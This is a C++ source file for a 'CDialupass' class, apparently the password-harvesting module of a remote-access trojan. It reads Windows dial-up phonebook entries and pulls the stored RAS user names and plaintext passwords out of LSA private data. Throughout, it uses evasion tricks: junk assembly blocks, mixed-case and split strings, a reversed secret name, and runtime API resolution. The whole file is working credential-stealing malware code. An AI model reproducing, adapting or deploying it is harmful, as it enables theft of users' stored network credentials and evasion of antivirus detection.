// Dialupass.cpp: implementation of the CDialupass class.
//
//////////////////////////////////////////////////////////////////////
#include "StdAfx.h"
#include "Dialupass.h"
#include "until.h"


bool CDialupass::GetRasEntries()
{
	typedef int (WINAPI *lstrlenAT)
		(
		__in LPCSTR lpString
		);
	lstrlenAT plstrlenA = (lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	int		nCount = 0;
	char	*lpPhoneBook[2];

    char	szPhoneBook1[MAX_PATH+1], szPhoneBook2[MAX_PATH+1];
	GetWindowsDirectory(szPhoneBook1, sizeof(szPhoneBook1));
	typedef __out LPSTR (WINAPI *lstrcpyAT)
		(
		__out LPSTR lpString1,
		__in  LPCSTR lpString2
		);
	lstrcpyAT plstrcpyA = (lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcpyA");
	

	plstrcpyA(strchr(szPhoneBook1, '\\') + 1, "Docume~1\\");
	lstrcat(szPhoneBook1, m_lpCurrentUser);
	char bbs1[80]="\\APPlication DATa\\Microsoft\\Network\\";
	char bbs2[80]="ConneCtIOns\\pbk\\raSPHONE.pbk";
	char bbs3[160];
	wsprintf(bbs3,"%s%s",bbs1,bbs2);
	lstrcat(szPhoneBook1, bbs3);
    SHGetSpecialFolderPath(NULL,szPhoneBook2, 0x23, 0);
	wsprintf(szPhoneBook2, "%s\\%s", szPhoneBook2, "mICRosoFT\\nETwORK\\cONNECtIONS\\PBK\\RASPHONE.PBK");
	
	lpPhoneBook[0] = szPhoneBook1;
	lpPhoneBook[1] = szPhoneBook2;
	
	
	OSVERSIONINFO osi;
	osi.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
    GetVersionEx(&osi);
	
	if(osi.dwPlatformId == VER_PLATFORM_WIN32_NT && osi.dwMajorVersion >= 5)
	{
		GetLsaPasswords();
	}	

	DWORD	nSize = 1024 * 4;
	char	*lpszReturnBuffer = new char[nSize];

	for (int i = 0; i < sizeof(lpPhoneBook) / sizeof(int); i++)
	{
		memset(lpszReturnBuffer, 0, nSize);
		typedef DWORD (WINAPI *GetPrivateProfileSectionNamesAT)
			(   
			__out_ecount_part_opt(nSize, return + 1) LPSTR lpszReturnBuffer,
			__in     DWORD nSize,
			__in_opt LPCSTR lpFileName
			);
		GetPrivateProfileSectionNamesAT pGetPrivateProfileSectionNamesA = (GetPrivateProfileSectionNamesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetPrivateProfileSectionNamesA");

		pGetPrivateProfileSectionNamesA(lpszReturnBuffer, nSize, lpPhoneBook[i]);
		for(char *lpSection = lpszReturnBuffer; *lpSection != '\0'; lpSection += plstrlenA(lpSection) + 1)
		{	
			char	*lpRealSection = (char *)UTF8ToGB2312(lpSection);
			char	strDialParamsUID[256];
			char	strUserName[256];
			char	strPassWord[256];
			char	strPhoneNumber[256];
			char	strDevice[256];
			memset(strDialParamsUID, 0, sizeof(strDialParamsUID));
			memset(strUserName, 0, sizeof(strUserName));
			memset(strPassWord, 0, sizeof(strPassWord));
			memset(strPhoneNumber, 0, sizeof(strPhoneNumber));
			memset(strDevice, 0, sizeof(strDevice));


			int	nBufferLen = GetPrivateProfileString(lpSection, "DialParamsUID", 0, 
				strDialParamsUID, sizeof(strDialParamsUID),	lpPhoneBook[i]);

			if (nBufferLen > 0)//DialParamsUID=4326020    198064
			{
				for(int j=0; j< (int)m_nRasCount; j++)
				{
					if(lstrcmp(strDialParamsUID, m_PassWords[j].UID)==0)
					{

						plstrcpyA(strUserName, m_PassWords[j].login); 
						plstrcpyA(strPassWord, m_PassWords[j].pass); 
						m_PassWords[j].used=true;
						m_nUsed++;
						break;
					}
				}
			}

			GetPrivateProfileString(lpSection, "PhoneNumber", 0, 
				strPhoneNumber, sizeof(strDialParamsUID),	lpPhoneBook[i]);
			GetPrivateProfileString(lpSection, "Device", 0, 
				strDevice, sizeof(strDialParamsUID),	lpPhoneBook[i]);
			char *lpRealDevice = (char *)UTF8ToGB2312(strDevice);
			char *lpRealUserName = (char *)UTF8ToGB2312(strUserName);
	 		Set(strDialParamsUID, lpRealSection, lpRealUserName, strPassWord,
 			strPhoneNumber, lpRealDevice);
			delete	lpRealSection;
			__asm
			{
				nop
					nop
					nop
					sub eax,0
					add eax,0
					sub eax,0
					add eax,0
					
};
			delete	lpRealUserName;
			delete	lpRealDevice;
		}
	}
	delete lpszReturnBuffer;

	return true;
}

BOOL CDialupass::Set(char *DialParamsUID, char *Name,char *User,char *Password,char *PhoneNumber, char *Device)
{
	for(int i=0; i<m_nMax; i++){
        if(0==strcmp(OneInfo[i]->Get(STR_DialParamsUID), DialParamsUID)){

            if(Name!=NULL)
                OneInfo[i]->Set(STR_Name,Name);
            if(User!=NULL)
                OneInfo[i]->Set(STR_User,User);
            if(Password!=NULL)
                OneInfo[i]->Set(STR_Password,Password);
            if(PhoneNumber!=NULL)
                OneInfo[i]->Set(STR_PhoneNumber,PhoneNumber);
            if(Device!=NULL)
                OneInfo[i]->Set(STR_Device, Device);
            return TRUE;
        }
    }

    if(m_nMax < m_nRasCount){

        OneInfo[m_nMax] = new COneInfo;
		OneInfo[m_nMax]->Set(STR_DialParamsUID,DialParamsUID);
        OneInfo[m_nMax]->Set(STR_Name,Name);
        OneInfo[m_nMax]->Set(STR_User,User);
        OneInfo[m_nMax]->Set(STR_Password,Password);
        OneInfo[m_nMax]->Set(STR_PhoneNumber,PhoneNumber);
        OneInfo[m_nMax]->Set(STR_Device,Device);
        m_nMax ++;
        return TRUE;
    }
	return false;
}

LPCTSTR CDialupass::UTF8ToGB2312(char UTF8Str[])
{
	typedef int (WINAPI *lstrlenAT)
		(
		__in LPCSTR lpString
		);
	__asm
	{
		nop
			nop
			nop

};
	lstrlenAT plstrlenA = (lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");

	if (UTF8Str == NULL || plstrlenA(UTF8Str) == 0)
		return "";
	int	nStrLen = plstrlenA(UTF8Str) * 2;
	char *lpWideCharStr = new char[nStrLen];
	char *lpMultiByteStr = new char[nStrLen];

	MultiByteToWideChar(CP_UTF8, 0, UTF8Str, -1, (LPWSTR)lpWideCharStr, nStrLen);
	WideCharToMultiByte(CP_ACP, 0, (LPWSTR)lpWideCharStr, -1, lpMultiByteStr, nStrLen, 0, 0);

	delete lpWideCharStr;
	return lpMultiByteStr;
}

CDialupass::CDialupass()
{
    m_nMax = 0;
	m_lpCurrentUser = GetCurrentLoginUser();
	m_nRasCount = GetRasEntryCount();
	m_PassWords = new PASSWORDS[m_nRasCount];
	OneInfo = new COneInfo* [m_nRasCount];
	m_nUsed = 0;
	__asm
	{
		nop
			nop
			nop
			
};
	m_nCount = 0;	
	GetRasEntries();
}


CDialupass::~CDialupass()
{
	__asm
	{
		nop
			nop
			nop
			sub eax,0
			add eax,0
			sub eax,0
			add eax,0
			
	};    for(int i=0; i<m_nRasCount; i++)
	delete OneInfo[i];
		delete m_PassWords;
		if (!m_lpCurrentUser)
			delete m_lpCurrentUser;
}

DWORD CDialupass::GetRasEntryCount()
{
	typedef int (WINAPI *lstrlenAT)
		(
		__in LPCSTR lpString
		);
	lstrlenAT plstrlenA = (lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");
	typedef __out LPSTR (WINAPI *lstrcpyAT)
		(
		__out LPSTR lpString1,
		__in  LPCSTR lpString2
		);
	lstrcpyAT plstrcpyA = (lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrcpyA");

	int		nCount = 0;
	char	*lpPhoneBook[2];
    char	szPhoneBook1[MAX_PATH+1], szPhoneBook2[MAX_PATH+1];

	GetWindowsDirectory(szPhoneBook1, sizeof(szPhoneBook1));

	plstrcpyA(strchr(szPhoneBook1, '\\') + 1, "Docume~1\\");
	lstrcat(szPhoneBook1, m_lpCurrentUser);
	char ljj1[80]="\\APPlication DATa\\Microsoft\\Network\\";
	char ljj2[80]="ConneCtIOns\\pbk\\raSPHONE.pbk";
	char ljj3[160];
	wsprintf(ljj3,"%s%s",ljj1,ljj2);
	lstrcat(szPhoneBook1, ljj3);
    SHGetSpecialFolderPath(NULL,szPhoneBook2, 0x23, 0);

//	char bbs23[] ={'M','i','c','r','o','s','o','f','t','\\','N','e','t','w','o','r','k','\\','C','o','n','n','e','c','t','i','o','n','s,'\\','p','b','k','\\','r','a','s','p','h','o','n','e','.','p','b','k','\0'};
	wsprintf(szPhoneBook2, "%s\\%s", szPhoneBook2, "mICRosoFT\\nETwORK\\cONNECtIONS\\PBK\\RASPHONE.PBK");
                                                    

	__asm
	{
		nop
			nop
			nop
			
	};
	lpPhoneBook[0] = szPhoneBook1;
	lpPhoneBook[1] = szPhoneBook2;
__asm
	{
		nop
			nop
			nop
			sub eax,0
			add eax,0
			
}
	DWORD	nSize = 1024 * 4;
	char	*lpszReturnBuffer = new char[nSize];
	
	for (int i = 0; i < sizeof(lpPhoneBook) / sizeof(int); i++)
	{
		typedef DWORD (WINAPI *GetPrivateProfileSectionNamesAT)
			(   
			__out_ecount_part_opt(nSize, return + 1) LPSTR lpszReturnBuffer,
			__in     DWORD nSize,
			__in_opt LPCSTR lpFileName
			);
		GetPrivateProfileSectionNamesAT pGetPrivateProfileSectionNamesA = (GetPrivateProfileSectionNamesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetPrivateProfileSectionNamesA");

		memset(lpszReturnBuffer, 0, nSize);
		pGetPrivateProfileSectionNamesA(lpszReturnBuffer, nSize, lpPhoneBook[i]);
		for(char *lpSection = lpszReturnBuffer; *lpSection != '\0'; lpSection += plstrlenA(lpSection) + 1)
		{
			nCount++;
		}
	}
	delete lpszReturnBuffer;
	return nCount;
}

LPTSTR CDialupass::GetLocalSid()
{
	__asm
	{
		nop
			nop
			
			
	};
	union
	{
		SID s;
		char c[256];
	}Sid;
	DWORD sizeSid=sizeof(Sid);
	char DomainName[256];
	DWORD sizeDomainName=sizeof(DomainName);
	SID_NAME_USE peUse;
	LPSTR pSid;
	
	__asm
	{
		nop
			nop
			
	};
	if (m_lpCurrentUser == NULL)
		return NULL;
	
	if(!LookupAccountName(NULL,m_lpCurrentUser,(SID*)&Sid,&sizeSid,DomainName,&sizeDomainName,&peUse))return NULL;
	if(!IsValidSid(&Sid))return NULL;
	
	
	typedef BOOL  (WINAPI *ConvertSid2StringSid)(PSID  , LPTSTR *);
	ConvertSid2StringSid proc;
	HINSTANCE	hLibrary = LoadLibrary("advapi32.dll");
	proc = (ConvertSid2StringSid) GetProcAddress(hLibrary, "ConvertSidToStringSidA");
	if(proc)   proc((SID*)&Sid.s,&pSid);
	FreeLibrary(hLibrary);
	return pSid;
	__asm
	{
		nop
			
	};
}


void CDialupass::AnsiStringToLsaStr(LPSTR AValue,PLSA_UNICODE_STRING lsa)
{
	typedef int (WINAPI *lstrlenAT)
		(
		__in LPCSTR lpString
		);
	lstrlenAT plstrlenA = (lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"lstrlenA");
	
	lsa->Length=plstrlenA(AValue)*2;
	lsa->MaximumLength=lsa->Length+2;
	lsa->Buffer=(PWSTR)malloc(lsa->MaximumLength);
	MultiByteToWideChar(NULL,NULL,(LPCSTR)AValue,plstrlenA(AValue),lsa->Buffer,lsa->MaximumLength);
}




PLSA_UNICODE_STRING CDialupass::GetLsaData(LPSTR KeyName)
{
	LSA_OBJECT_ATTRIBUTES LsaObjectAttribs;
	LSA_HANDLE LsaHandle;
	LSA_UNICODE_STRING LsaKeyName;
	NTSTATUS nts;
	PLSA_UNICODE_STRING OutData;
	__asm
	{
		nop
			nop
			nop
			sub eax,0
			add eax,0
			sub eax,0
					add eax,0
					sub eax,0
					add eax,0
			
	};
	ZeroMemory(&LsaObjectAttribs,sizeof(LsaObjectAttribs));
	nts=LsaOpenPolicy(NULL,&LsaObjectAttribs,POLICY_GET_PRIVATE_INFORMATION,&LsaHandle);
	if(nts!=0)return NULL;
	AnsiStringToLsaStr(KeyName, &LsaKeyName);
	nts=LsaRetrievePrivateData(LsaHandle, &LsaKeyName,&OutData);
	if(nts!=0)return NULL;
	nts=LsaClose(LsaHandle);
	if(nts!=0)return NULL;
	return OutData;
}

void CDialupass::ParseLsaBuffer(LPCWSTR Buffer,USHORT Length)
{
	__asm
	{
		nop
			nop
			nop
			sub eax,5
			add eax,5
			sub eax,0
					add eax,0
			
	};
	char AnsiPsw[1024];
	char chr,PswStr[256];
	PswStr[0]=0;
	WideCharToMultiByte(0,NULL,Buffer,Length,AnsiPsw,1024,0,0);
	
	for(int i=0,SpacePos=0,TXT=0;i<Length/2-2;i++)
	{
		chr=AnsiPsw[i];
		if(chr==0)
		{
			SpacePos++;
			switch(SpacePos)
			{
			case 1:
				PswStr[TXT]=chr;
				strcpy(m_PassWords[m_nUsed].UID,PswStr);
				break;
			case 6:
				PswStr[TXT]=chr;
				strcpy(m_PassWords[m_nUsed].login,PswStr);
				break;
			case 7:
				PswStr[TXT]=chr;
				strcpy(m_PassWords[m_nUsed].pass,PswStr);
				m_PassWords[m_nUsed].used=false;
				m_nUsed++;
				break;
				__asm
				{
					nop
						nop
						nop
						
				};
			}
			ZeroMemory(PswStr,256);
			TXT=0;
		}
		else 
		{
			PswStr[TXT]=chr;
			TXT++;
		}
		if(SpacePos==9)SpacePos=0;
	}
}

void CDialupass::GetLsaPasswords()
{
	PLSA_UNICODE_STRING PrivateData;
	//char Win2k[]="RasDialParams!%s#0";
	//char WinXP[]="L$_RasDefaultCredentials#0";
	char Win2k[MAX_PATH];
	char WinXP[MAX_PATH];
	wsprintf(Win2k,"%slPa%ss#0","RasDia","rams!%");
	wsprintf(WinXP,strrev("0s%rCtlus%L"),"$_RasDefa","edentials#");
	__asm
	{
		nop
			nop
			nop
			
	};
	char temp[256];
	
	wsprintf(temp,Win2k,GetLocalSid());
	
	PrivateData=GetLsaData(temp);
	if(PrivateData!=NULL)
	{
		ParseLsaBuffer(PrivateData->Buffer,PrivateData->Length);
		LsaFreeMemory(PrivateData->Buffer); 
	}
	
	PrivateData=GetLsaData(WinXP);
	if(PrivateData!=NULL)
	{ 
		ParseLsaBuffer(PrivateData->Buffer,PrivateData->Length);
		LsaFreeMemory(PrivateData->Buffer); 
	}
}

